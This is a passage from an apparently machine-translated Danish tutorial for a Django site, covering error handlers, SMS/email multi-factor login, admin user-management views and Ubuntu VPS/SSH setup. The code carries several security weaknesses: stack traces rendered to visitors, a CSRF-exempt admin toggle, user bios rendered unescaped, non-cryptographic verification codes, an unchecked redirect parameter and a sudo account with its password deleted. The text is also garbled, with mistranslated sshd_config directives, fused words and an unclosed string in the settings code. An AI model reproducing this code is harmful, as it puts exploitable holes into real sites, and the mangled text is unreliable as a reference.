    return render(request, 'errors/live_error.html', {'title': 'Error Logs', 'pagetitle': 'Error Logs', 'notes': 'These are the recent error logs.', 'trace': logs, 'full': True})

@login_required
@user_passes_test(is_superuser_or_vendor)
def logs_api(request):
    logs = highlight_code(get_logs())
    return HttpResponse(logs)

@login_required
def handler404(request, exception):
    if not request.path.endswith('/'): return redirect(request.path + '/')
    return render(request, 'errors/error.html', {'title': 'Error 404', 'pagetitle': 'Error 404', 'notes': 'This page was not found on the server. It may have moved or been deleted.', 'is_404': True})

def handler500(request):
    print(get_current_exception())
    user = None
    if hasattr(request, 'user') and request.user and request.user.is_authenticated:
        user = request.user
    try:
        Error.objects.create(user=user, stack_trace=get_current_exception(), notes='Logged by 500 handler.')
    except: pass
    return render(request, 'errors/error.html', {'title': 'Error 500', 'pagetitle': 'Error 500', 'notes': 'There is a problem with the server, or with a request coming from you. Thank you for your understanding while we get things set up.', 'trace': get_current_exception()})

def handler403(request, exception):
    return render(request, 'errors/error.html', {'title': 'Error 403', 'pagetitle': 'Error 403', 'notes': 'You don\'t have permission to preform this request. If you think this is in error, please contact the server administrator.', 'is_403': True})

def handler400(request, exception):
    return render(request, 'errors/error.html', {'title': 'Error 400', 'pagetitle': 'Error 400', 'notes': 'This was a bad request.'})
</code></pre>Lad os derefter definere middleware til at håndtere disse fejl. Vi vil gøre dette ved først at tilføje til Middleware_Classes i indstillinger.py, med navnet på vores middleware.<pre class="language-python"><code>
MIDDLEWARE_CLASSES = [
    # ... Tidligere middleware
    'errors.middleware.ExceptionVerboseMiddleware,
]
</code></pre>Lad os derefter tilføje middleware.<pre class="language-python"><code>
from threading import local
import traceback
from django.utils.deprecation import MiddlewareMixin

_error = local()

class ExceptionVerboseMiddleware(MiddlewareMixin):
    def process_exception(self, request, exception):
        _error.value = traceback.format_exc()

def get_current_exception():
    try:
        return _error.value
    except AttributeError:
        return None

def set_current_exception(exception):
    try:
        _error.value = exception
    except AttributeError:
        print('Attribute error setting exception.')
</code></pre>Vi tilføjer en funktion for at få den aktuelle undtagelse ved at bruge en trådlokal, som hjælper os med at spore eventuelle fejl i vores kode. Med hensyn til skabeloner har vi kun brug for en, fordi vi dynamisk definerer titlen i visningen. Skabelonen er bare nødt til at gengive titlen og "spor", vores fejl traceback fra konteksten.<pre class="language-bash"><code>
nano errors/templates/errors/error.html
</code></pre>
<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% block content %}
&lt;h1&gt;{{ pagetitle }}&lt;/h1&gt;
&lt;p&gt;{{ trace }}&lt;/p&gt;
{% endblock %}
 </code></pre>Dette er vores enkleste skabelon endnu, men det er hvor let det er at se fejlene i vores projekt. Lad os derefter deaktivere debug i indstillinger.<pre class="language-bash"><code>
nano app/settings.py
</code></pre>Find denne linje, hvor den er indstillet til sand, og skift den til falsk<pre class="language-python"><code>
DEBUG = False
</code></pre>Gå videre og sikkerhedskopier appen nu. Vi er klar til at implementere til en fjerntliggende Linux -server og fortsætter med at tilføje funktioner derfra.<pre class="language-bash"><code>
sudo backup
</code></pre>Inden vi poster denne kode på en server, skal vi overveje, at der kan være nogle problemer med koden. Afhængig af sagen, vil websteder, der accepterer oplysninger, der er lagt ud til dem, have problemer med, at spam bliver sendt og vanskeligheder med at fjerne spam. Dette skulle ikke ske med det samme, men hvis det sker, vil vi senere undersøge, hvordan man automatisk modererer spam på webstedet og gør det sværere for robotter at få adgang til webstedet sammen med, hvordan man deaktiverer brugerkonti og verificerer en brugers identitet med En scanning af deres ID eller en biometrisk scanning, som et fingeraftryk eller ansigtsgenkendelse.

Ser man på det flerfaktorautentificeringseksempel, vi undersøgte, i produktion, kan tingene være forskellige. Bemærk, hvordan vi er begrænsende login og udløber tokens. Hvis robotter får adgang til et websted, kan to faktorgodkendelse være vanskeligere, da de kan indtaste koder på samme tid, som brugeren er. For at bekæmpe dette, lad os bruge en model i brugermodellerne og erklære, hvordan vi interagerer med webstedet, når vi erAutentificering ved hjælp af multi faktor -godkendelse med et telefonnummer. Vi tilføjer også en mulighed for at autentificere med e -mail. Start med at redigere brugermodellerne med<pre class="language-bash"><code>
nano users/models.py
</code></pre>Dette er, hvordan den model, vi tilføjer, skal se ud. Vi har ikke brug for nogen metoder, bare variabler til at gemme et ID, brugeren, tidsstemplet, udløb, længde og forsøg mod enhver multi -faktor -godkendelse (en kode som 123456 sendt til en telefon eller e -mail).<pre class="language-python"><code>
# Et grundlæggende token, der blev brugt til at logge på webstedet
class MFAToken(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='mfa_tokens')
    timestamp = models.DateTimeField(default=timezone.now)
    expires = models.DateTimeField(default=timezone.now)
    token = models.CharField(default='', max_length=100)
    length = models.IntegerField(default=6)
    attempts = models.IntegerField(default=0)
    uid = models.CharField(default=uuid.uuid4, max_length=100)
</code></pre>Lad os også tilføje et privilegium til vores bruger, og vi vil indstille det manuelt i øjeblikket, før vi til sidst migrerer til at få privilegerede brugere automatisk. I brugermodellerne skal du tilføje denne linje i profilen:<pre class="language-python"><code>
    vendor = models.BooleanField(default=False)
</code></pre>Som med eventuelle ændringer i databasen, er vi nødt til at lave migrationer og migrere databasen, hver gang vi redigerer en modeller.py -fil i Django. Husk at gøre dette bruger vi først kilde (hvis det ikke allerede er blevet brugt, siden terminalen var åben) og derefter python management.py for at gøre migrationerne og migrere.<pre class="language-bash"><code>
cd project-directory-you-named # (hvis nødvendigt)
source venv/bin/activate
python manage.py makemigrations &amp;&amp; python manage.py migrate
</code></pre>For øjeblikket kan du indrømme alle konti, du har oprettet som leverandører ved hjælp af skallen.<pre class="language-bash"><code>
python manage.py shell
from users.models import Profile
p = Profile.objects.get(user__username='Charlotte')
p.vendor = True
p.save()
exit()
</code></pre>Lad os nu udvikle vores multifaktor -godkendelsesvisning for at bruge dette token. Først er vi nødt til at ændre vores MFA Helper Utilities. Brug af nano,<pre class="language-bash"><code>
nano users/mfa.py
</code></pre>
<pre class="language-python"><code>
from django.utils import timezone
import random
import datetime
from django.conf import settings
from feed.middleware import get_current_request
from django.contrib import messages
from .email import send_html_email
import traceback
from .models import MFAToken

account_sid = settings.TWILIO_ACCOUNT_SID
auth_token = settings.TWILIO_AUTH_TOKEN
source_phone = settings.PHONE_NUMBER

def send_text(target_phone, text):
    from twilio.rest import Client
    try:
        client = Client(account_sid, auth_token)
        if len(target_phone) &gt;= 11:
            message = client.messages.create(
                to=target_phone,
                from_=source_phone,
                body=text + ' Text STOP to cancel.')
    except:
        messages.warning(get_current_request(), 'There was an error sending the message.')
        print(traceback.format_exc())

def get_num_length(num, length):
    n = ''
    for x in range(length):
        n = n + str(num)
    return int(n)

def send_verification_text(user, token):
    length = user.profile.verification_code_length
    code = random.randint(get_num_length(1, length), get_num_length(9, length));
    token.token = code
    token.expires = timezone.now() + datetime.timedelta(minutes=settings.AUTH_VALID_MINUTES)
    token.save()
    send_user_text(user, "Your verification code for {} is {}".format(settings.SITE_NAME, str(code)))

def send_verification_email(user, token):
    length = user.profile.verification_code_length
    code = random.randint(get_num_length(1, length), get_num_length(9, length));
    token.token = code
    token.expires = timezone.now() + datetime.timedelta(minutes=settings.AUTH_VALID_MINUTES)
    token.save()
    send_html_email(user, "Your verification code for {} is {}".format(settings.SITE_NAME, str(code)), "&lt;p&gt;Dear {},&lt;/p&gt;&lt;p&gt;Your verification code for {} is {}. Thank you for using this code to secure your account.&lt;/p&gt;&lt;h2&gt;{}&lt;/h2&gt;&lt;p&gt;Sincerely, {}&lt;/p&gt;".format(user.profile.name, settings.SITE_NAME, str(code), str(code), settings.SITE_NAME))

def send_user_text(user, text):
    send_text(user.profile.phone_number, text)

def check_verification_code(user, token, code):
    token.attempts = token.attempts + 1
    profile = user.profile
    result = (token != None and code != '' and token.token == code and (token.expires &gt; timezone.now()) and token.attempts &lt;= settings.MFA_TOKEN_ATTEMPTS)
    if token.attempts &lt; 3 and result:
        profile.verification_code_length = 6
    elif token.attempts &gt; 1 and not result:
        profile.verification_code_length = profile.verification_code_length + 2
        if profile.verification_code_length &gt; settings.MFA_TOKEN_LENGTH: profile.verification_code_length = settings.MFA_TOKEN_LENGTH
    token.save()
    profile.save()
    return result
</code></pre>
<pre class="language-python"><code>
# Autentificer brugeren ved hjælp af deres e -mail eller telefonnummer
def mfa(request, username, usertoken):
    token = MFAToken.objects.filter(uid=username, expires__gt=timezone.now() + datetime.timedelta(seconds=30)).order_by('-timestamp').last() # Filtrer tokenet efter den værdi, der er sendt i URL'en (en UUID)
    if not token: token = MFAToken.objects.create(user=User.objects.filter(profile__uuid=username).first(), uid=username, expires=timezone.now() + datetime.timedelta(seconds=115)) # Hvis denne session ikke er oprettet, skal du oprette den
    user = User.objects.filter(id=token.user.id).first() # Få brugeren fra token
    if not user and request.user.is_authenticated: return redirect(reverse('feed:home')) # Hvis de allerede er godkendt, skal du logge dem ind
    if not user: raise PermissionDenied() # Benægte, hvis der ikke blev fundet nogen bruger
    next = request.GET.get('next','')
    if not user.profile.enable_two_factor_authentication and user.is_active and user.profile.check_auth_token(usertoken, token): # Kontroller autoren token
        auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend') # Log ind brugeren, hvis de ikke allerede er logget ind
        user.profile.mfa_expires = timezone.now() + datetime.timedelta(minutes=settings.LOGIN_VALID_MINUTES) # Indstil udløbet af deres multifaktor -godkendelse
        user.profile.save()
        return HttpResponseRedirect(next if next != '' else reverse('landing:landing')) # Omdirigere brugeren til næste side
    if not user.profile.mfa_enabled: # Kontroller, om MFA er aktiveret
        if not check_verification_time(user, token): # Kontroller tiden
            user.profile.mfa_enabled = False # Ryd telefonnummeret
            user.profile.enable_two_factor_authentication = True # Aktivér MFA
            user.profile.phone_number = '+1' # Deaktiver telefonnummeret
            user.profile.save() # Gem profilen
            auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend') # Log brugeren ind, hvis deres MFA ikke er aktiveret
            messages.warning(request, 'Please enter a valid phone number and verify it with a code.')
            return redirect(reverse('users:mfa_onboarding'))
    if request.method == 'POST' and not fraud_detect(request, True): # Hvis anmodningen er en anmodning om indlæg
        form = TfaForm(request.POST) # Instant formularen
        code = str(form.data.get('code', None)) # Få koden
        if code and code != '' and code != None: # Sørg for, at det ikke er tomt
            token_validated = user.profile.check_auth_token(usertoken) # Kontroller autoren token
            p = user.profile
            is_verified = check_verification_code(user, token, code) # Kontroller koden
            p.mfa_authenticated = is_verified
            if token_validated: # Hvis alt
                if is_verified: # Er i orden
                    user.profile.mfa_enabled = True # Aktivér MFA (hvis ikke allerede aktiveret)
                    user.profile.save()
                    auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend') # Log ind brugeren
                    face = user.faces.filter(session_key=None).last() 
                    p.mfa_expires = timezone.now() + datetime.timedelta(minutes=settings.LOGIN_VALID_MINUTES)
                    p.save()
                    messages.success(request, 'You have been authenticated. Welcome.')
                    qs = '?'
                    for key, value in request.GET.items(): # Byg en forespørgselsstring til den næste parameter (hvis nogen)
                        qs = qs + key + '=' + value + '&amp;'
                    if next != '' and not (next.startswith('/accounts/logout/') or  next.startswith('/accounts/login/') or next.startswith('/admin/login/') or next.startswith('/accounts/register/')):
                        return HttpResponseRedirect(next) # Omdirigere
                    elif next.startswith('/accounts/logout/') or next.startswith('/accounts/login/') or next.startswith('/accounts/register/'):
                        return redirect(reverse('/'))
                    elif request.META.get('HTTP_REFERER', '/').startswith('/accounts/login/'):
                        return redirect(reverse('/'))
                    elif not next:
                        return redirect(reverse('/'))
                    else:
                        return HttpResponseRedirect(reverse('verify:age') + '?next=' + request.META.get('HTTP_REFERER', '/'))
                else:
                    messages.warning(request, 'The code you entered was not recognized. Please try again.')
            elif not token_validated: # Hvis tokenet var ugyldigt
                messages.warning(request, 'The URL token has expired or was not recognized. Please try again.')
                logout(request)
                return redirect(reverse('users:login'))
            if p.mfa_attempts &gt; 3: # Hvis der var for mange forsøg
                messages.warning(request, 'You have entered the incorrect code more than 3 times. please send yourself a new code.')
                p.verification_code = None
                p.save()
        elif user.profile.can_send_mfa &lt; timezone.now():
            user.profile.mfa_attempts = 0
            user.profile.can_send_mfa = timezone.now() + datetime.timedelta(minutes=2)
            user.profile.save()
            if form.data.get('send_email', False): # Send e -mailen (eller teksten)
                send_mfa_verification_email(user, token)
            else:
                send_verification_text(user, token)
            messages.success(request, "Please enter the code sent to your phone number or email. The code will expire in 3 minutes.")
        elif user.profile.can_send_mfa &lt; timezone.now() + datetime.timedelta(seconds=115):
            messages.warning(request, 'You are sending too many two factor authentication codes. Wait a few minutes before sending another code.')
    form = TfaForm()
    hide_logo = None
    if user.profile.hide_logo:
        hide_logo = True
    if request.user.is_authenticated: return redirect(reverse('/'))
    # Gengiv formularen (til få anmodninger)
    return render(request, 'users/mfa.html', {'title': 'Enter Code', 'form': form, 'xsmall': True, 'user': user, 'hide_logo': hide_logo, 'accl_logout': user.profile.shake_to_logout, 'preload': False, 'autofocus': request.method == 'POST'})
</code></pre>Når vi tilføjer denne kode, skal du sørge for at importere funktionen til at sende en e -mail. Øverst på filen tilføjer brugeren (med anden import)<pre class="language-python"><code>
from .mfa import send_verification_email as send_mfa_verification_email
</code></pre>Nu er vi nødt til at skrive denne funktion, før noget af dette fungerer. Det skal udvide vores Send -e -mail -funktion og blot sende en e -mail til brugeren med verifikationskoden.<pre class="language-bash"><code>
nano users/mfa.py
</code></pre>
<pre class="language-python"><code>
def send_verification_email(user, token):
    length = user.profile.verification_code_length
    code = random.randint(get_num_length(1, length), get_num_length(9, length));
    token.token = code
    token.expires = timezone.now() + datetime.timedelta(minutes=settings.AUTH_VALID_MINUTES)
    token.save()
    send_html_email(user, "Your verification code for {} is {}".format(settings.SITE_NAME, str(code)), "&lt;p&gt;Dear {},&lt;/p&gt;&lt;p&gt;Your verification code for {} is {}. Thank you for using this code to secure your account.&lt;/p&gt;&lt;h2&gt;{}&lt;/h2&gt;&lt;p&gt;Sincerely, {}&lt;/p&gt;".format(user.profile.name, settings.SITE_NAME, str(code), str(code), settings.SITE_NAME))
</code></pre>Så alt dette fungerer godt, nu har vi et multi -faktor -godkendelsessystem, der afhænger af et telefonnummer eller e -mail til at logge ind. Men vi har også brug for en måde at fjerne eller i det mindste skjule brugere, der ikke samarbejder med vores betingelser. Dette kan være spammere, robotter eller enhver, der ikke betyder godt for vores arbejde. Se på en visning, jeg har for at overvåge brugere på min hjemmeside:<pre class="language-python"><code>
# beløb
from django.contrib.auth.decorators import login_required
from django.contrib.auth.decorators import user_passes_test
from .tests import is_superuser_or_vendor # Vi bliver nødt til at oprette denne test

@login_required
@user_passes_test(is_superuser_or_vendor)
def users(request):
    # Få liste over brugere
    new_today = User.objects.filter(is_active=True, date_joined__gte=timezone.now() - datetime.timedelta(hours=24)).count()
    new_this_month = User.objects.filter(is_active=True, date_joined__gte=timezone.now() - datetime.timedelta(hours=24*30)).count()
    subscribers = User.objects.filter(is_active=True, profile__subscribed=True).count()
    return render(request, 'users/users.html', { # Returner brugere i en skabelon
        'title': 'All Accounts',
        'users': User.objects.all(),
        'new_today': new_today,
        'new_this_month': new_this_month,
        'subscribers': subscribers
    })
</code></pre>Bemærk, at denne kode bruger en test, vi bliver nødt til at erklære denne test i en tests.py -fil og importere den. Redigering af brugere/tests.Py, lad os oprette testen.<pre class="language-python"><code>
def is_superuser_or_vendor(user):
    return user.profile.vendor or user.is_superuser
</code></pre>Dette er i forbindelse med brugerne/brugerne.html -skabelonen, der ligner sådan:<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% load app_filters %}
{% block content %}
&lt;h1&gt;All Registered Visitors&lt;/h1&gt;
&lt;p&gt;{{ new_today|nts|capitalize }} new today, {{ new_this_month|nts }} new this month, {{ subscribers|nts }} subscribers, {{ users.count|nts }} total.&lt;/p&gt;
&lt;hr style="color: red;"&gt;
{% for user in users %}
{% include 'users/_user.html' %}
&lt;hr style="color: blue;"&gt;
{% endfor %}
{% endblock %}
 </code></pre>Bemærk, at skabelonen indeholder en anden skabelon, brugere/_user.html. Når du bruger en skabelon, der har en undertemplate og ikke bruger udvidelser, er det en god ide at tilføje en understregning (_) før navnet på filen, der skal udvides, for at skelne skabeloner.

Bemærk, at dette er en masse Jinja, du har muligvis ikke alle disse variabler defineret. Men sådan ser min kode ud.<pre class="language-markup"><code> 
{% load app_filters %}
&lt;div&gt;
&lt;img src="{{ user.profile.get_image_url }}" alt="@{{ user.profile.name }}'s profile photo" width="120" height="120" align="left" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;"/&gt;
    &lt;div class="article-metadata"&gt;
      &lt;p class="mr-2"&gt;@{{ user.username }} - {{ user.profile.name }} ({{ user.profile.preferred_name }})&lt;/p&gt;
      &lt;small class="text-muted"&gt;Last seen {{ user.profile.last_seen|date:"F d, Y" }} {{ user.profile.last_seen|time:"H:i" }}&lt;/small&gt;
      &lt;small class="text-muted"&gt;Joined on {{ user.profile.date_joined|date:"F d, Y" }} {{ user.profile.date_joined|time:"H:i" }}&lt;/small&gt;
      &lt;small&gt;{{ user.email }}&lt;/small&gt;
      {% if user.profile.phone_number %}&lt;small&gt;&lt;i class="bi bi-phone-fill"&gt;&lt;/i&gt;{{ user.profile.phone_number }}&lt;/small&gt;{% endif %}
      {% if user.verifications.last %}
      &lt;small&gt;'{{ user.verifications.last.full_name }}'&lt;/small&gt;
      &lt;small&gt;&lt;i class="bi bi-123"&gt;&lt;/i&gt; {{ user.verifications.last.document_number }}&lt;/small&gt;
      &lt;small&gt;&lt;i class="bi bi-calendar-heart-fill"&gt;&lt;/i&gt; {{ user.verifications.last.birthdate }}&lt;/small&gt;
      &lt;a href="{{ user|document_front }}" class="btn btn-sm btn-outline-primary" title="ID front"&gt;&lt;i class="bi bi-person-badge-fill"&gt;&lt;/i&gt; ID front&lt;/a&gt;
      &lt;a href="{{ user|document_back }}" class="btn btn-sm btn-outline-primary" title="ID back"&gt;&lt;i class="bi bi-upc-scan"&gt;&lt;/i&gt; ID back&lt;/a&gt;
      {% endif %}
      &lt;small&gt;# {{User.id}} &lt;/small&gt;
      &lt;small&gt;{% if user.profile.subscribed %}Subscribed{% else %}Not subscribed{% endif %}&lt;/small&gt;
    &lt;/div&gt;
    {%if not user.is_superuser %}
    &lt;div style="float: right;"&gt;{% include 'users/toggle_active.html' %}&lt;/div&gt;
    {% endif %}
    {% autoescape off %}    
    &lt;p class="article-content"&gt;{{ user.bio }}&lt;/p&gt;
    {% endautoescape %}
    &lt;hr&gt;
    &lt;p&gt;{% if user.profile.identity_verified %}Verified user.{% else %}Unverified user.{% endif %} Verifications: {{ user.verifications.count|nts }}&lt;/p&gt;
 </code></pre>Vi har også brug for en anden undertemplate, Toggle_active.html. Denne skabelon skal være en form, der giver os mulighed for at skifte, om en bruger er aktiv.<pre class="language-markup"><code> 
&lt;form style="display: inline-block;" action="{% url 'users:toggle-user-active' user.id %}" method="POST" id="publishForm"&gt;
&lt;button class="btn btn-sm btn-outline-danger" type="submit"&gt;{% if user.is_active %}&lt;i class="bi bi-eye-fill"&gt;&lt;/i&gt;{% else %}&lt;i class="bi bi-eye-slash-fill"&gt;&lt;/i&gt;{% endif %}&lt;/button&gt;
&lt;/form&gt;
 </code></pre>Vi bliver også nødt til at tilføje en visning for at skifte brugeraktivitet og passende URL -mønstre. Mens vi er ved det, lad os tilføje en visning for at slette en bruger, hvis vi har brug for det.<pre class="language-python"><code>
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
@login_required
@user_passes_test(is_superuser_or_vendor)
def toggle_user_active(request, pk):
    user = User.objects.get(id=pk)
    if request.method == 'POST':
        user.is_active = not user.is_active
        user.save()
    return HttpResponse('&lt;i class="bi bi-eye-fill"&gt;&lt;/i&gt;' if user.is_active else '&lt;i class="bi bi-eye-slash-fill"&gt;&lt;/i&gt;')


# Beløb
from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin
from django.views.generic import DeleteView

class UserDeleteView(LoginRequiredMixin, UserPassesTestMixin, DeleteView):
    model = User
    success_url = '/' # Omdirigering af succes -URL
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        return context

    def test_func(self): # Test, hvis brugeren er superbruger og har tilladelse til at slette
        user = self.get_object()
        if self.request.user != user and self.request.user.is_superuser:
            return True
        return False
</code></pre>Selvom dette er praktisk, når det er nødvendigt, skal sletning af en bruger ikke være nødvendig for det meste af tiden, kan vi bare skifte synligheden af ​​brugere, der besøger webstedet, hvis vi har brug for at afvise dem.

De URL -mønstre, vi tilføjede, ser sådan ud. Med Nano, rediger brugere/urls.py og tilføj disse linjer:<pre class="language-bash"><code>
nano users/urls.py
</code></pre>Linjerne skal gå på listen over stier i brugervisningen, inden afslutningen “]”, men efter begyndelsen “[”.<pre class="language-python"><code>
# ...
    path('user/&lt;int:pk&gt;/delete/', UserDeleteView.as_view(template_name='blog/user_confirm_delete.html'), name='delete-user'),
    path('user/&lt;int:pk&gt;/active/', views.toggle_user_active, name='toggle-user-active'),
# ...
</code></pre>Sørg nu for at tage backup af webstedet, så du kan downloade det på webserveren, vi fortsætter med at arbejde på. Fra kommandolinjen,<pre class="language-bash"><code>
sudo backup
</code></pre>Nu er vores side sikkerhedskopieret.

Så nu har vi et par mere nyttige funktioner. Men hvad med det store billede her? Denne kode er stadig ikke tilgængelig fra internettet, vi har endnu ingen mailserver, og vi er nødt til at udvide vores app til at omfatte omfattende verifikationsproces såvel som glatte layouts for at hjælpe os med .

Vi kommer til alt dette. Den vigtigste ting for nu vil bare være at få denne kode online, som vi kan gøre med kun et par linjer med bash på en Ubuntu -server. Du bliver dog nødt til at leje en server til dette, medmindre du har en server derhjemme og et forretningsinternet -abonnement, der giver dig mulighed for at åbne porte. Jeg kører personligt min hjemmeside på en HP Z440, der er installeret i min lejlighed, men det er normalt meget billigere for grundlæggende behov for at leje en virtuel privat server (VPS).

Husk, at den kode, vi kører nu, er relativt tynd, den skal opretholdes og forbedres, før vi erKlar til at bruge det, vi har til at opbygge et produkt. Sørg for at være forsigtig med, hvad du gør med internettet, sørg for, at hvis du implementerer dette websted offentligt på nettet på en Linux -server, har du en plan for at blokere uønskede interaktioner med dit websted. Dette vil sandsynligvis ikke være et problem i starten, men vi vil undersøge en række løsninger til at bekæmpe dette, herunder maskinlæring, kunstig intelligens og computervision. Når det bliver et problem, skal du se yderligere på denne tekst for en løsning.

Med hensyn til leje af en VPS er der mange steder, du kan gå. Google Cloud har VPS -servere, Ionos, Kamatera, Amazon AWS og flere udbydere tilbyder cloud -serverløsninger, der passer til vores behov.


Du skal klikke gennem deres formularer og vælge en plan for at komme i gang. Du kan gå med en grundlæggende plan med enhver udbyder, men sørg for, at udbyderen giver dig mulighed for at åbne Port Mail Server -porte til at sende e -mail (dette skal være port 587 og port 25), nogle udbydere blokerer disse porte. Indtil videre har jeg haftEST -erfaring med Ionos og Kamatera, begge af dem tillader mig at sende ubegrænset e -mail, og deres prisfastsættelse er ret billig.

Du opretter forbindelse til din nye server over en protokol kaldet SSH eller Secure Shell, som giver dig mulighed for at eksternt interface med serveren nøjagtigt som din personlige computer, fra din personlige computer. Når du opretter serveren, vil hostingudbyderen sandsynligvis bede dig om at tilføje en SSH -nøgle, eller de giver dig et brugernavn og adgangskode. SSH -nøglen er, hvordan du logger ind på serveren fra kommandolinjen for at redigere koden. Brug nedenstående ssh-tastegenmuligheder til at generere en SSH<pre class="language-bash"><code>
ssh-keygen
</code></pre>Gem filen og overskriv den, hvis du har brug for det, er det godt at rotere dine SSH -nøgler, hvis du ikke allerede har gjort det. Nu kan du bruge følgende kommando til at se din SSH -nøgle. Du vil kopiere den til din eksterne server, så du kan bruge den til at autentificere.<pre class="language-bash"><code>
cat ~/.ssh/id_rsa.pub
</code></pre>Hvis du ikke kunne se en SSH-nøgle, når du skriver denne kommando (en lang række cifre og bogstaver, der starter med "SSH-RSA AAA"), kan du prøve .) Følgende kode genererer en 4096 bit RSA SSH -nøgle.<pre class="language-bash"><code>
ssh-keygen -t rsa -b 4096
</code></pre>Opret en VPS, der kører Ubuntu, men du planlægger at gøre dette. Når du har oprettet en VPS ved at klikke via formularerne på udbyders websted (kamatera.com, ionos.com eller lignende), vil du logge ind. For at gøre dette skal du bruge SSH -kommandoen med din IP -adresse (adressen Det ligner xx.xx.xx.xx). Du skal også være følsom over for standardbrugernavnet på den server, vi oprettede, for eksempel Ubuntu.<pre class="language-bash"><code>
ssh ubuntu@XX.XX.XX.XX
</code></pre>Du bliver muligvis bedt om en adgangskode, hvis du bliver bedt om en adgangskode, skal du indtaste den i. Vi bruger ikke standard brugernavn, så lad os starte med at oprette en ny bruger og tilføje en SSH -nøgle til deres konto.

Lad os starte med at tilføje en ny SSHD_CONFIG -fil, der fortæller serveren, hvordan du bruger SSH.<pre class="language-bash"><code>
nano sshd_config
</code></pre>
<pre class="language-bash"><code>
# Dette er SSHD Server-systemdækkende konfigurationsfil.  Se
# sshd_config (5) for mere information.

# Denne sshd blev samlet med sti =/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/spil

# Strategien, der bruges til indstillinger i standard SSHD_CONFIG, der er sendt med
# OpenSSH er at specificere optioner med deres standardværdi, hvor
# muligt, men lad dem kommentere.  Ukommiterede indstillinger tilsidesætter
# Standardværdi.

# Port 22
# Adressefamilie enhver
# Listeadresse 0.0.0.0
# Lyt adress ::

# Hostkey/etc/ssh/ssh_host_rsa_key
# Hostkey/etc/ssh/ssh_host_ecdsa_key
# Hostkey/etc/ssh/ssh_host_ed25519_key

# Cifre og indtastning
# Rekeylimit Standard ingen

# Logning
# Syslogfacility Auth
# Loglevel info

# Autentificering:

# Logringracetime 2m
# Tilladrootlogin Prohibit-Password
# Strenge moder ja
# Maxauthies 6
# Maxessions 10

PubkeyAuthentication yes

# Forvent .ssh/autoriserede_keys2 vil blive ignoreret som standard i fremtiden.
AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2

# AuthorizedPrincipalSfile Ingen

# AutoriseretKeysCommand ingen
# AutoriseretKommanduser Ingen

# For at dette kan fungere, har du også brug for værtsnøgler i/etc/ssh/ssh_kendte_hosts
# Hostbasedauthentication nr
# Skift til ja, hvis du ikke stoler på ~/.ssh/kendte_hosts til
# Hostbasedauthentication
# Ignororuser kendtehosts nr
# Læs ikke brugerens ~/.rhosts og ~/.shosts -filer
# Ignorerhosts ja

# For at deaktivere tunnelede klare tekstadgangskoder skal du ændre sig til Nej her!
PasswordAuthentication no
# Tilladtemptypasswords nr

# Skift til ja for at muliggøre adgangskoder til udfordringsresponser (pas på problemer med
# Nogle PAM -moduler og tråde)
KbdInteractiveAuthentication no

# Kerberos -muligheder
# Kerberosauthentication nr
# Kerberosorlocalpasswd Ja
# KerberosticketCleanup Ja
# Kerberoskottet stang nr

# GSSAPI -indstillinger
# GSSapiauthentication NO
# GSSAPICLEANUPCREDIENTIALS JA
# GSSAPISTRICTACCEPTORCHECK JA
# GSSAPIKEYEXCHANGE NR

# Indstil dette til 'ja' for at aktivere PAM -godkendelse, kontobehandling,
# og sessionbehandling. Hvis dette er aktiveret, vil PAM -godkendelse
# være tilladt gennem kbdinteractiveauthentication og
# Adgangskodeauthentication.  Afhængig af din PAM -konfiguration,
# PAM -godkendelse via KBDInterActiveAuthentication kan omgå
# Indstillingen af ​​"tilladelsesrootlogin uden passord".
# Hvis du bare vil have PAM -kontoen og sessionskontrollerne til at køre uden
# PAM -godkendelse, aktiver derefter dette, men indstil adgangskodeauthentication
# og kbdinteractiveauthentication til 'nej'.
UsePAM yes

# AllowAgentforwarding Ja
# Allowtcpforwarding ja
# Gatewayports nr
X11Forwarding yes
# X11DisplayOffset 10
# X11USELOCALHOST JA
# Pille ja
PrintMotd no
# Printlastlog Ja
# Tcpkeepalive ja
# Permittuen miljø i
# Komprimering forsinket
# Klientinterval 0
# ClientaliveCountMax 3
# Brugt i
# Pidfile /run/ssshd.pid
# MaxStartups 10: 30: 100
# Pemittunl nr
# Chrootdirectory ingen
# Version tillæg ingen

# Ingen standard bannersti
Banner /etc/banner

# Tillad klienten at videregive de lokale miljøvariabler
AcceptEnv LANG LC_*

# Tilsidesættelsestandard for ingen delsystemer
Subsystem	sftp	/usr/lib/openssh/sftp-server

# Eksempel på tilsidesættende indstillinger pr. Brugerbasis
# Match bruger Anoncvs
# X11FORWARDING NR
# Allowtcpforwarding nr
# Tilladty ind
# Forcecommand CVS Server
PermitRootLogin no
</code></pre>Husk, Ctrl+X og Y for at gemme filen. Lad os derefter skrive et grundlæggende script kaldet Initialize (alt sammen i standardhjemkataloget for vores bruger).<pre class="language-bash"><code>
nano initialize
</code></pre>Føj disse linjer til filen, udskiftning<key here="">Med din SSH -nøgle fandt du ved hjælp af CAT. (.ssh/id_rsa.pub)<pre class="language-bash"><code>
# !
sudo apt install -y nano git openssh-server
sudo cp sshd_config /etc/ssh/sshd_config
sudo service ssh restart
sudo service sshd restart
echo "/root/.ssh/id_rsa" | sudo su root -c "ssh-keygen -t rsa -N ''"
echo "root ssh key:"
sudo su root -c "cat /root/.ssh/id_rsa.pub"
sudo adduser --disabled-password --gecos "" team
sudo passwd -d team
sudo usermod -aG sudo team
echo "/home/team/.ssh/id_rsa" | su team -c "ssh-keygen -t rsa -N ''"
cat /home/team/.ssh/id_rsa.pub &gt;&gt; /home/team/.ssh/authorized_keys
echo '&lt;key here&gt;' &gt;&gt; /home/team/.ssh/authorized_keys
echo "team ssh key:"
cat /home/team/.ssh/id_rsa.pub
